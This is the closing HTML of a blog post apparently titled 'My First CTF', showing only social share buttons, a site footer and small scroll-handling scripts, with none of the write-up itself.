<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share My First CTF on twitter" href="https://twitter.com/intent/tweet/?text=My%20First%20CTF&url=https%3a%2f%2frzul.me%2fen%2fposts%2ffirst-ctf%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share My First CTF on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2frzul.me%2fen%2fposts%2ffirst-ctf%2f&title=My%20First%20CTF&summary=My%20First%20CTF&source=https%3a%2f%2frzul.me%2fen%2fposts%2ffirst-ctf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share My First CTF on reddit" href="https://reddit.com/submit?url=https%3a%2f%2frzul.me%2fen%2fposts%2ffirst-ctf%2f&title=My%20First%20CTF"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share My First CTF on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frzul.me%2fen%2fposts%2ffirst-ctf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share My First CTF on whatsapp" href="https://api.whatsapp.com/send?text=My%20First%20CTF%20-%20https%3a%2f%2frzul.me%2fen%2fposts%2ffirst-ctf%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share My First CTF on telegram" href="https://telegram.me/share/url?text=My%20First%20CTF&url=https%3a%2f%2frzul.me%2fen%2fposts%2ffirst-ctf%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2022 <a href=https://rzul.me/en/>Román Zuleta</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
</body>
</html>